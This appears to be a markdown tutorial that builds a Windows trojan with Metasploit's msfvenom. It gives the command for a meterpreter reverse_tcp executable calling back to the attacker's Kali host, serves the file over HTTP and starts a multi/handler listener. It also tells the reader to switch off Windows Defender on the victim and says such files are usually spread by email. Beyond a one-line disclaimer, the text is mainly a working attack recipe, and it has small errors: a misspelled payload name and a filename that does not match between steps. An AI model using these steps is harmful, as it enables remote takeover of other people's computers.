# Hack_Windows_10_system_by_creating_Trojan
# Only for Educational purpose only"

## Using the Metasploit framework to hack Windows 10 system by creating Trojan

### Steps to Perform:

*  In Kali, execute the following command to learn about msfvenom, which is part of Metasploit.
`
msfvenom -h
`
*  Determine which payload you want to use. To list the available payload options, type:
`
msfvenom -l payloads
` 
* Choose the payload → ` windows/meterpreter/reverse_tcp ` We will use a reverse_tcp shell for a stable connection. But based on the kind of malware you want to create, you can choose the different available options.

*  We will create a directory for the payload and set the variables for it, Specify the listener IP address (attacker’s IP) with LHOST and the port to listen on with LPORT (The IP for LHOST is the IP of kali machine, i.e., ` 10.0.2.15 ` and use the
port is ` 443`)
  - Define the format of malicious file, i.e., exe
  - Specify the file name for .exe file

 ```
msfvenom -p windows/meterpreter/reverese_tcp LHOST=10.0.2.15 LPORT=443 -f exe > mal.exe
```
 
*  A malicious file, mal1.exe is created which upon execution on victims’ machine will give a reverse shell to an attacker.

*  Host this malicious file using the below command
```
python -m http.server 80
```
*  Launch the Metasploit console

*  Use ` exploit/multi/handler`

*  We will use the Metasploit console to set the payload, LHOST & LPORT. Run the exploit.

* Now, we must download the malicious file on Windows machine (victim)

* Before downloading the file, turn of the Windows Defender settings.

  - Turn off the Virus & Threat protection settings as well
 
*  Open internet explorer. Enter Kali’s IP in the URL bar along with the name of the file to download
> [!CAUTION]
> In an ideal scenario, these malicious files are sent via email or any other malware propagation ways.

* Save this file on desktop

* Click on the file and execute it

* Go back to Kali, you will see that the reverse TCP shell has started

#  ` You Got a Control over the device`
